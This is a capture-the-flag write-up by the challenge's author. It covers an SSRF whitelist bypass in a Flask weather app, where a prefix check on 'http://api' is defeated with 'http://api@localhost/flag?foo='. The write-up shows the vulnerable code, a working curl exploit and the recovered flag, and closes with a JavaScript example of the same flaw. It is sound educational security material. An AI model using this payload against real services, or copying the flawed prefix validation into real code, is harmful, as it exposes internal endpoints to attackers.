# JSON My Soul

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
    - [SSRF as a Service](#ssrf-as-a-service)
- [Exploitation](#exploitation)
- [Why I Made This Challenge](#why-i-made-this-challenge)
- [Conclusion](#conclusion)

</details>

## Overview

- Author: @siunam
- 38 solves / 115 points
- Intended difficulty: Easy

## Background

G'day mate, I love JSON, so much so that all the data from my internal weather API service are in JSON format!

![](https://github.com/siunam321/CTF-Writeups/blob/main/PUCTF-2025/images/Pasted%20image%2020250429142727.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/PUCTF-2025/images/Pasted%20image%2020250213185735.png)

In here, it seems like this web application is a simple weather application. Let's try to click the "Get Latest Weather Information" button!

![](https://github.com/siunam321/CTF-Writeups/blob/main/PUCTF-2025/images/Pasted%20image%2020250429144003.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/PUCTF-2025/images/Pasted%20image%2020250429143924.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/PUCTF-2025/images/Pasted%20image%2020250429144332.png)

When we clicked that button, it'll send a GET request to `/api/weather` with parameter `url`. After that, the server responds us with a JSON object.

Hmm... Let's try to read this web application to have a better understanding in it.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/PUCTF-2025/web/JSON-My-Soul/JSON-My-Soul.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/PUCTF-2025/Web-Exploitation/JSON-My-Soul)-[2025.04.29|14:35:53(HKT)]
└> file JSON-My-Soul.tar.gz 
JSON-My-Soul.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 20480
┌[siunam♥Mercury]-(~/ctf/PUCTF-2025/Web-Exploitation/JSON-My-Soul)-[2025.04.29|14:35:53(HKT)]
└> tar -v --extract --file JSON-My-Soul.tar.gz
./
./api/
./api/src/
./api/src/app.py
./api/Dockerfile
./docker-compose.yml
./frontend/
./frontend/src/
./frontend/src/app.py
./frontend/src/templates/
./frontend/src/templates/index.html
./frontend/src/static/
./frontend/src/static/css/
./frontend/src/static/css/main.css
./frontend/Dockerfile
```

After reading the source code a little bit, we know that this web application has 2 services, which are `frontend` and `api`. Both of them are written in Python with [Flask](https://flask.palletsprojects.com/en/stable/) web application framework.

First off, what's this challenge objective? Where's the flag?

In service `frontend` main logic Python script, `frontend/src/app.py`, GET route `/flag`, the Flask web app checks whether **the client request's IP address is equal to the loopback address (`127.0.0.1`)**:

```python
FLAG = os.environ.get('FLAG', 'PUCTF25{fake_flag_do_not_submit}')
[...]
LOCALHOST_IP_ADDRESS = '127.0.0.1'
[...]
@app.route('/flag', methods=['GET'])
def getFlag():
    isClientAddressLocalhost = True if request.remote_addr == LOCALHOST_IP_ADDRESS else False
    if not isClientAddressLocalhost:
        return jsonify({'message': 'Try harder :D'})
    
    return jsonify({'message': FLAG})
```

If it's equal to the loopback address, we can get the flag. Well, looks like we need to somehow bypass this validation in order to get the flag. Let's figure this out.

In GET route `/api/weather`, we can send a GET parameter `url`, which the application sends a GET request to the API service, `http://api/api/weather`:

```python
WHITELIST_API_URL = os.environ.get('WHITELIST_API_URL', 'http://api')

API_ENDPOINT = '/api/weather'
[...]
@app.route(API_ENDPOINT, methods=['GET'])
def getWeatherInformation():
    url = request.args.get('url', WHITELIST_API_URL).lower().strip()
    [...]
    try:
        apiResponse = requests.get(f'{url}{API_ENDPOINT}', allow_redirects=False)
        apiJsonData = apiResponse.json()
    except:
        return jsonify({'message': 'Something went wrong with the API service. Sorry!'})

    return apiJsonData
```

> Note: In Docker, Docker containers can be referred by using their service name and the name will be resolved as an IP address. In this case, the `api` service's service name is `api`. Therefore, we can use `api` hostname as the IP address for the `api` container.

However, it has the following validation:

```python
WHITELIST_API_URL = os.environ.get('WHITELIST_API_URL', 'http://api')
[...]
@app.route(API_ENDPOINT, methods=['GET'])
def getWeatherInformation():
    [...]
    if not url.startswith(WHITELIST_API_URL):
        return jsonify({'message': 'Invalid API URL.'})
    [...]
```

As you can see, it checks our parameter `url` is start with `http://api` (`WHITELIST_API_URL`) or not. If it's not, it'll return JSON object `{'message': 'Invalid API URL.'}`. Unfortunately, this validation is flawed.

In the [`startswith`](https://docs.python.org/3/library/stdtypes.html#str.startswith) function, the argument (`WHITELIST_API_URL`) is the substring of the target string `url`. Since `WHITELIST_API_URL` is a constant value, we can change the target string to match the substring like the follownig:

```shell
┌[siunam♥Mercury]-(~/ctf/PUCTF-2025/Web-Exploitation/JSON-My-Soul)-[2025.04.29|14:50:29(HKT)]
└> python3
[...]
>>> WHITELIST_API_URL = 'http://api'
>>> url = 'http://apianything'
>>> url.startswith(WHITELIST_API_URL)
True
```

Hmm... How can we leverage this flawed validation into something useful to us?

### SSRF as a Service

In the whitelisted API URL, it's missing a forward slash (`/`) character at the end, which means we can make the `api` domain as a user information subcomponent ([RFC 3986 3.2.1. User Information](https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.1)) and make the URL's host (domain) as `localhost` to perform SSRF (Server-Side Request Forgery) attack.

> SSRF vulnerability refers to a flaw that allows attackers to access internal services.

But hang on, which port should we access? If we take a look at `frontend/Dockerfile`, we can see that this Flask web application uses [Gunicorn](https://gunicorn.org/) as the [WSGI (Web Server Gateway Interface)](https://wsgi.readthedocs.io/en/latest/what.html). Most importantly, this application is listening on all network interfaces (`0.0.0.0`) on port `80`:

```bash
[...]
CMD ["gunicorn", "-w", "4", "app:app", "-b 0.0.0.0:80"]
```

With that said, we should access port `80` in our payload.

To get the flag, we could send the following GET request:

```http
GET /api/weather?url=http://api@localhost/flag HTTP/1.1
Host: chal.polyuctf.com:41342


```

By doing so, the GET route `/flag`'s `isClientAddressLocalhost` can be bypassed, because the `request.remote_addr` will be `127.0.0.1` (`localhost`).

However, the above payload shouldn't work, as the route will append `/api/weather` (`API_ENDPOINT`) to our path:

```python
API_ENDPOINT = '/api/weather'
[...]
@app.route(API_ENDPOINT, methods=['GET'])
def getWeatherInformation():
    url = request.args.get('url', WHITELIST_API_URL).lower().strip()
    [...]
    try:
        apiResponse = requests.get(f'{url}{API_ENDPOINT}', allow_redirects=False)
        apiJsonData = apiResponse.json()
    except:
        return jsonify({'message': 'Something went wrong with the API service. Sorry!'})
    [...]
```

In the above case, if we send payload `http://api@localhost/flag`, the final URL will be like this: `http://api@localhost/flag/api/weather`. Since this appended URL endpoint (`/flag/api/weather`) doesn't exist on the `frontend` service, it'll return HTTP status "404 Not Found".

To solve this issue, we can append a [URL query](https://datatracker.ietf.org/doc/html/rfc3986#section-3.4) to our payload:

```
http://api@localhost/flag?foo=
```

Or, you can use [URL fragment](https://datatracker.ietf.org/doc/html/rfc3986#section-3.5) (`#`) to let the request treat `/api/weather` as a fragment:

```
http://api@localhost/flag#
```

> Note: Make sure you URL encode your payload. Otherwise the `url` parameter's value might be treated as another parameter or URL fragment.

By doing so, we can bypass the flawed whitelist validation and the appended `API_ENDPOINT`.

## Exploitation

Armed with above information, we can send the following GET request to get the flag:

```shell
┌[siunam♥Mercury]-(~/ctf/PUCTF-2025/Web-Exploitation/JSON-My-Soul)-[2025.04.29|15:03:19(HKT)]
└> curl -s --get http://chal.polyuctf.com:41342/api/weather --data 'url=http://api@localhost/flag?foo=' | jq -r '.["message"]'
PUCTF25{WH173l1S7_4Pp0R4cH_C4N_4lS0_b3_BYP4223d_33671ad267a035702f9222a37d6776c2}
```

- **Flag: `PUCTF25{WH173l1S7_4Pp0R4cH_C4N_4lS0_b3_BYP4223d_33671ad267a035702f9222a37d6776c2}`**

## Why I Made This Challenge

Originally, this challenge is something related to parser differential between JSON and XML, or how clean code can lead to vulnerability (Inspired from this LiveOverflow video: [Authentication Bypass Using Root Array](https://www.youtube.com/watch?v=2vAr9K5chII)). I even named this challenge title: "JSON My Soul", which is a reference to one of many Hololive's memes, [JDON My Soul](https://www.youtube.com/watch?v=k2naDLRJA50).

However, during my free time, I came across with this video from [freeCodeCamp.org](https://www.youtube.com/@freecodecamp): [JavaScript Security Vulnerabilities Tutorial – With Code Examples](https://youtu.be/ypNKKYUJE5o). In Brandon's second example, he demo'd a simple SSRF attack (Starting from [5:23](https://youtu.be/ypNKKYUJE5o?t=323)). In the mitigation example, he validates the URL in a whitelist approach, like the following:

```javascript
const allowedURLs = ["https://internal.myapp.com/data/countries.json", "https://internal.myapp.com/data/states.json"]
const url = req.query.url;

if (!allowedURLs.includes(url)) {
    return res.status(400).json({ error: "Bad URL" });
}
```

Wait, it uses function `includes`? Isn't that doesn't care about where the substring is? So maybe we can bypass it like this?

```shell
┌[siunam♥Mercury]-(~/ctf/PUCTF-2025/Web-Exploitation/JSON-My-Soul)-[2025.04.29|15:17:43(HKT)]
└> nodejs
[...]
> const allowedURLs = ["https://internal.myapp.com/data/countries.json", "https://internal.myapp.com/data/states.json"]
[...]
> allowedURLs.includes("http://localhost/?foo=https://internal.myapp.com/data/countries.json");
false
```

Huh, `false`? Oh, wait... According to [method `includes` documentation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/includes), it returns `true` when an array includes a certain value among its entries. In this case, the above URL doesn't exist in the array entries, thus returned `false`.

Hmm... What if it uses `startsWith` instead of `includes`?

```javascript
> allowedURLs[0].startsWith("https://internal.myapp.com/data/countries.json");
true
```

Can we still bypass it? Let's assume the first item of `allowedURLs` array is `https://internal.myapp.com`:

```javascript
> allowedURLs[0] = "https://internal.myapp.com";
[...]
> allowedURLs[0].startsWith("https://internal.myapp.com");
true
> allowedURLs[0].startsWith("https://internal.myapp.com@localhost/");
false
```

Wait, why `false`? Oh, wait a minute, it's because the substring (`https://internal.myapp.com@localhost/`) doesn't exist in the target string (`allowedURLs[0]`).

Huh... What if we switch the substring and the target string like this:

```javascript
> const userInput = "https://internal.myapp.com@localhost";
[...]
> userInput.startsWith(allowedURLs[0]);
true
```

Since the substring (`allowedURLs[0]`) is a constant, we can bypass this check via matching the substring in the target string like this: `https://internal.myapp.com@localhost`.

If I made this kind of stupid mistake, I'm pretty sure that other developers will also accidentally do that. With this in mind, I proceed to change the topic of this challenge to this SSRF whitelist bypass.

## Conclusion

What we've learned:

1. SSRF whitelist domain bypass via flawed validation